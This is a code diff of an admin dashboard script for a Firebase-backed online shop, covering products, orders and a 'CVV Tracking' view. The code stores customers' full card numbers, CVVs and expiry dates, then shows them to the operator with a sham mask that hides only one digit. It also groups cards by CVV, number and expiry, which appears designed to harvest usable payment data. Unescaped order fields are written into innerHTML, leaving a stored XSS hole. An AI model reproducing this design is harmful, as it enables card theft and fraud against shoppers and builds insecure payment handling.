@@ -1,47 +1,65 @@
-// Check if user is admin
+// Admin Dashboard JavaScript
+
+// Function to mask card number - SIRF LAST 1 DIGIT HIDE
+function maskCardNumber(cardNumber) {
+    if (!cardNumber) return 'N/A';
+    
+    // Remove spaces
+    const clean = cardNumber.replace(/\s/g, '');
+    
+    if (clean.length >= 16) {
+        // First 15 digits show, last 1 digit hide with *
+        const first15 = clean.slice(0, 15);
+        
+        // Format with spaces after every 4 digits
+        const formatted = first15.match(/.{1,4}/g)?.join(' ') || first15;
+        return formatted + '*';  // Last digit replaced with *
+    }
+    
+    return cardNumber;
+}
+
+// Check authentication
 auth.onAuthStateChanged(async (user) => {
     if (!user) {
         window.location.href = 'index.html';
         return;
     }
     
-    // Verify admin status
+    // Check if admin
     const userDoc = await db.collection('users').doc(user.uid).get();
     if (!userDoc.exists || userDoc.data().role !== 'admin') {
-        alert('Access denied!');
+        alert('Access Denied: Admin only');
         window.location.href = 'index.html';
         return;
     }
     
-    // Load admin data
+    // Set admin name
+    document.getElementById('adminName').textContent = user.displayName || 'Admin';
+    
+    // Load all data
     loadDashboardStats();
     loadProducts();
     loadOrders();
     loadCVVTracking();
-    loadCompanyCards();
-    
-    // Setup image preview
-    setupImagePreview();
 });
 
 // Show different sections
 function showSection(sectionId) {
-    document.querySelectorAll('.admin-section').forEach(s => {
-        s.classList.remove('active');
-    });
-    
-    document.querySelectorAll('.admin-sidebar li').forEach(i => {
-        i.classList.remove('active');
-    });
-    
+    document.querySelectorAll('.admin-section').forEach(s => s.classList.remove('active'));
     document.getElementById(sectionId).classList.add('active');
-    event.target.closest('li').classList.add('active');
     
-    // Refresh data
-    if (sectionId === 'products') loadProducts();
-    if (sectionId === 'orders') loadOrders();
-    if (sectionId === 'cvv-tracking') loadCVVTracking();
-    if (sectionId === 'cards') loadCompanyCards();
+    document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
+    event.currentTarget.classList.add('active');
+    
+    const titles = {
+        'dashboard': 'Dashboard',
+        'products': 'Products',
+        'add-product': 'Add Product',
+        'orders': 'Orders',
+        'cvv-tracking': 'CVV Tracking'
+    };
+    document.getElementById('pageTitle').textContent = titles[sectionId];
 }
 
 // Load dashboard stats
@@ -51,10 +69,8 @@ async function loadDashboardStats() {
         document.getElementById('totalOrders').textContent = ordersSnapshot.size;
         
         let revenue = 0;
-        ordersSnapshot.forEach(doc => {
-            revenue += doc.data().totalAmount || 0;
-        });
-        document.getElementById('totalRevenue').textContent = '₹' + revenue;
+        ordersSnapshot.forEach(doc => revenue += doc.data().totalAmount || 0);
+        document.getElementById('totalRevenue').textContent = '₹' + revenue.toLocaleString();
         
         const productsSnapshot = await db.collection('products').get();
         document.getElementById('totalProducts').textContent = productsSnapshot.size;
@@ -64,7 +80,7 @@ async function loadDashboardStats() {
     }
 }
 
-// Load all products
+// Load products
 async function loadProducts() {
     try {
         const snapshot = await db.collection('products').get();
@@ -75,17 +91,12 @@ async function loadProducts() {
             const product = doc.data();
             tbody.innerHTML += `
                 <tr>
-                    <td>
-                        <img src="${product.imageUrl || 'https://via.placeholder.com/50'}" 
-                             style="width: 50px; height: 50px; object-fit: cover; border-radius: 5px;">
-                    </td>
-                    <td>${product.name}</td>
-                    <td>₹${product.price}</td>
-                    <td>${product.category}</td>
-                    <td>${product.stock}</td>
-                    <td>
-                        <button onclick="deleteProduct('${doc.id}')" class="btn-delete">Delete</button>
-                    </td>
+                    <td><img src="${product.imageUrl || 'https://via.placeholder.com/50'}" class="product-image"></td>
+                    <td>${product.name || ''}</td>
+                    <td>₹${product.price || 0}</td>
+                    <td>${product.category || ''}</td>
+                    <td>${product.stock || 0}</td>
+                    <td><button class="btn-danger" onclick="deleteProduct('${doc.id}')">Delete</button></td>
                 </tr>
             `;
         });
@@ -94,147 +105,73 @@ async function loadProducts() {
     }
 }
 
-// Setup image preview
-function setupImagePreview() {
-    const imageInput = document.getElementById('productImage');
-    const preview = document.getElementById('imagePreview');
-    const previewImg = preview.querySelector('img');
-    const previewSpan = preview.querySelector('span');
-
-    imageInput.addEventListener('change', function(e) {
-        const file = e.target.files[0];
-        if (file) {
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                previewImg.src = e.target.result;
-                previewImg.style.display = 'block';
-                previewSpan.style.display = 'none';
-            }
-            reader.readAsDataURL(file);
-        }
-    });
-}
-
-// Product form submit
+// Add product
 document.getElementById('productForm')?.addEventListener('submit', async (e) => {
     e.preventDefault();
     
-    const submitBtn = document.getElementById('submitBtn');
-    const progressDiv = document.getElementById('uploadProgress');
-    const progressFill = document.getElementById('progressFill');
-    
-    submitBtn.disabled = true;
-    progressDiv.style.display = 'block';
-    
     try {
-        // Get form values
-        const name = document.getElementById('productName').value;
-        const price = parseFloat(document.getElementById('productPrice').value);
-        const category = document.getElementById('productCategory').value;
-        const description = document.getElementById('productDescription').value;
-        const stock = parseInt(document.getElementById('productStock').value);
-        const imageFile = document.getElementById('productImage').files[0];
+        const productData = {
+            name: document.getElementById('productName').value,
+            price: parseFloat(document.getElementById('productPrice').value),
+            category: document.getElementById('productCategory').value,
+            description: document.getElementById('productDescription').value,
+            stock: parseInt(document.getElementById('productStock').value),
+            imageUrl: document.getElementById('productImageUrl').value,
+            createdAt: new Date().toISOString()
+        };
         
-        if (!imageFile) {
-            alert('Please select an image');
-            return;
-        }
-        
-        // 1. Upload image to Firebase Storage
-        const storageRef = storage.ref();
-        const imageRef = storageRef.child(`products/${Date.now()}_${imageFile.name}`);
-        
-        // Upload with progress
-        const uploadTask = imageRef.put(imageFile);
-        
-        uploadTask.on('state_changed',
-            (snapshot) => {
-                // Progress
-                const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
-                progressFill.style.width = progress + '%';
-                progressFill.textContent = Math.round(progress) + '%';
-            },
-            (error) => {
-                console.error('Upload error:', error);
-                alert('Image upload failed');
-                submitBtn.disabled = false;
-            },
-            async () => {
-                // Upload complete - get download URL
-                const imageUrl = await imageRef.getDownloadURL();
-                
-                // 2. Save product to Firestore with image URL
-                const productData = {
-                    name: name,
-                    price: price,
-                    category: category,
-                    description: description,
-                    stock: stock,
-                    imageUrl: imageUrl,
-                    createdAt: new Date().toISOString()
-                };
-                
-                await db.collection('products').add(productData);
-                
-                alert('Product added successfully!');
-                
-                // Reset form
-                e.target.reset();
-                document.querySelector('#imagePreview img').style.display = 'none';
-                document.querySelector('#imagePreview span').style.display = 'block';
-                progressDiv.style.display = 'none';
-                submitBtn.disabled = false;
-                
-                // Refresh products list
-                loadProducts();
-                
-                // Switch to products view
-                showSection('products');
-            }
-        );
+        await db.collection('products').add(productData);
+        alert('✅ Product added!');
+        e.target.reset();
+        loadProducts();
+        showSection('products');
         
     } catch (error) {
-        console.error('Error adding product:', error);
-        alert('Error adding product: ' + error.message);
-        submitBtn.disabled = false;
-        progressDiv.style.display = 'none';
+        console.error('Error:', error);
+        alert('Error: ' + error.message);
     }
 });
 
 // Delete product
 async function deleteProduct(productId) {
-    if (confirm('Are you sure you want to delete this product?')) {
-        try {
-            await db.collection('products').doc(productId).delete();
-            loadProducts();
-        } catch (error) {
-            console.error('Error deleting product:', error);
-            alert('Error deleting product');
-        }
+    if (confirm('Delete this product?')) {
+        await db.collection('products').doc(productId).delete();
+        loadProducts();
+        loadDashboardStats();
     }
 }
 
-// Load all orders
+// Load orders with MASKED CARD NUMBERS (last digit hidden)
 async function loadOrders() {
     try {
         const snapshot = await db.collection('orders').orderBy('createdAt', 'desc').get();
         const tbody = document.getElementById('ordersBody');
         tbody.innerHTML = '';
         
+        if (snapshot.empty) {
+            tbody.innerHTML = '<tr><td colspan="8">No orders found</td></tr>';
+            return;
+        }
+        
         snapshot.forEach(doc => {
             const order = doc.data();
             const products = order.products || [];
             const productNames = products.map(p => p.name).join(', ');
+            const card = order.cardDetails || {};
+            
+            // ✅ Mask card number - show first 15 digits, hide last 1
+            const maskedCard = maskCardNumber(card.cardNumber);
             
             tbody.innerHTML += `
                 <tr>
-                    <td>${doc.id.slice(0, 8)}...</td>
+                    <td>#${doc.id.slice(-8)}</td>
                     <td>${order.userEmail || 'N/A'}</td>
-                    <td>${productNames.slice(0, 30)}${productNames.length > 30 ? '...' : ''}</td>
+                    <td>${productNames.slice(0, 30)}...</td>
                     <td>₹${order.totalAmount}</td>
-                    <td>${order.cardDetails?.cardNumber || 'N/A'}</td>
-                    <td>${order.cardDetails?.cvv || 'N/A'}</td>
-                    <td>${new Date(order.createdAt).toLocaleString()}</td>
+                    <td class="card-number">${maskedCard}</td>
+                    <td><strong>${card.cvv || 'N/A'}</strong></td>
+                    <td>${card.expiry || 'N/A'}</td>
+                    <td>${new Date(order.createdAt).toLocaleDateString()}</td>
                 </tr>
             `;
         });
@@ -243,34 +180,38 @@ async function loadOrders() {
     }
 }
 
-// Load CVV tracking
+// Load CVV tracking with MASKED CARD NUMBERS
 async function loadCVVTracking() {
     try {
         const ordersSnapshot = await db.collection('orders').get();
-        
         const cvvStats = {};
         
         ordersSnapshot.forEach(doc => {
             const order = doc.data();
-            const cvv = order.cardDetails?.cvv;
-            const cardNumber = order.cardDetails?.cardNumber;
+            const card = order.cardDetails || {};
+            const cvv = card.cvv;
+            const cardNumber = card.cardNumber;
+            const expiry = card.expiry || 'N/A';
             
-            if (cvv) {
-                if (!cvvStats[cvv]) {
-                    cvvStats[cvv] = {
+            if (cvv && cardNumber) {
+                const key = `${cvv}_${cardNumber}_${expiry}`;
+                
+                if (!cvvStats[key]) {
+                    cvvStats[key] = {
                         cvv: cvv,
                         cardNumber: cardNumber,
+                        expiry: expiry,
                         totalOrders: 0,
                         totalAmount: 0,
                         lastUsed: order.createdAt
                     };
                 }
                 
-                cvvStats[cvv].totalOrders++;
-                cvvStats[cvv].totalAmount += order.totalAmount || 0;
+                cvvStats[key].totalOrders++;
+                cvvStats[key].totalAmount += order.totalAmount || 0;
                 
-                if (order.createdAt > cvvStats[cvv].lastUsed) {
-                    cvvStats[cvv].lastUsed = order.createdAt;
+                if (order.createdAt > cvvStats[key].lastUsed) {
+                    cvvStats[key].lastUsed = order.createdAt;
                 }
             }
         });
@@ -279,12 +220,16 @@ async function loadCVVTracking() {
         tbody.innerHTML = '';
         
         Object.values(cvvStats).forEach(stat => {
+            // ✅ Mask card number in CVV tracking too
+            const maskedCard = maskCardNumber(stat.cardNumber);
+            
             tbody.innerHTML += `
                 <tr>
                     <td><strong>${stat.cvv}</strong></td>
-                    <td>${stat.cardNumber || 'N/A'}</td>
+                    <td class="card-number">${maskedCard}</td>
+                    <td>${stat.expiry}</td>
                     <td>${stat.totalOrders}</td>
-                    <td>₹${stat.totalAmount}</td>
+                    <td>₹${stat.totalAmount.toLocaleString()}</td>
                     <td>${new Date(stat.lastUsed).toLocaleString()}</td>
                 </tr>
             `;
@@ -295,81 +240,8 @@ async function loadCVVTracking() {
     }
 }
 
-// Load company cards
-async function loadCompanyCards() {
-    try {
-        const snapshot = await db.collection('companyCards').get();
-        const tbody = document.getElementById('cardsBody');
-        tbody.innerHTML = '';
-        
-        snapshot.forEach(doc => {
-            const card = doc.data();
-            tbody.innerHTML += `
-                <tr>
-                    <td>${card.cardNumber}</td>
-                    <td>${card.cvv}</td>
-                    <td>${card.expiry}</td>
-                    <td>${card.assignedTo}</td>
-                    <td>${card.department}</td>
-                    <td>
-                        <button onclick="deleteCard('${doc.id}')" class="btn-delete">Delete</button>
-                    </td>
-                </tr>
-            `;
-        });
-    } catch (error) {
-        console.error('Error loading cards:', error);
-    }
-}
-
-// Card modal functions
-function showAddCardForm() {
-    document.getElementById('cardModal').style.display = 'block';
-}
-
-function closeCardModal() {
-    document.getElementById('cardModal').style.display = 'none';
-    document.getElementById('cardForm').reset();
-}
-
-// Add new card
-document.getElementById('cardForm')?.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    
-    const cardData = {
-        cardNumber: document.getElementById('newCardNumber').value,
-        cvv: document.getElementById('newCardCVV').value,
-        expiry: document.getElementById('newCardExpiry').value,
-        assignedTo: document.getElementById('assignedTo').value,
-        department: document.getElementById('department').value,
-        createdAt: new Date().toISOString()
-    };
-    
-    try {
-        await db.collection('companyCards').add(cardData);
-        alert('Card added successfully!');
-        closeCardModal();
-        loadCompanyCards();
-    } catch (error) {
-        console.error('Error adding card:', error);
-        alert('Error adding card');
-    }
-});
-
-// Delete card
-async function deleteCard(cardId) {
-    if (confirm('Are you sure?')) {
-        try {
-            await db.collection('companyCards').doc(cardId).delete();
-            loadCompanyCards();
-        } catch (error) {
-            console.error('Error deleting card:', error);
-        }
-    }
-}
-
 // Logout
 function logout() {
     auth.signOut();
     window.location.href = 'index.html';
-        }
+}
